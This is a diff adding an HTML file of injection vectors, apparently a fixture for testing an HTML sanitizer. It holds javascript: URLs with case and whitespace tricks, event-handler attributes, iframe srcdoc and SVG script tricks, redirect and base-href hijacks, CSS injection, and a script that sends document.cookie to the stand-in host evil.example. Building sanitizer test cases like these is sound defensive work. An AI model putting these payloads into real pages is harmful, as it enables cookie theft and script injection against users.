@@ -1,0 +1,16 @@
+<meta http-equiv="refresh" content="0; url=https://evil.example">
+<base href="https://evil.example/">
+<link rel="stylesheet" href="https://evil.example/site.css">
+<style>@import url(https://evil.example/x.css); body { display: none }</style>
+<script>fetch("https://evil.example/?c=" + document.cookie)</script>
+<a href="javascript:alert(1)" onclick="alert(2)">one</a>
+<a href="JAVASCRIPT:alert(1)">two</a>
+<a href=" javascript:alert(1)" target="_blank">three</a>
+<a href="#top">four</a>
+<img src="javascript:alert(1)" srcset="https://evil.example/2x.png 2x" onerror="alert(3)" alt="pixel">
+<iframe srcdoc="<script>alert(4)</script>" onload="alert(5)"></iframe>
+<object data="https://evil.example/x.swf"></object>
+<embed src="https://evil.example/x.swf">
+<template><script>alert(6)</script></template>
+<svg xmlns="http://www.w3.org/2000/svg" width="10"><foreignObject><script>alert(7)</script></foreignObject></svg>
+<p style="color: red; background: url('https://evil.example/x.png') } body { display: none">styled</p>
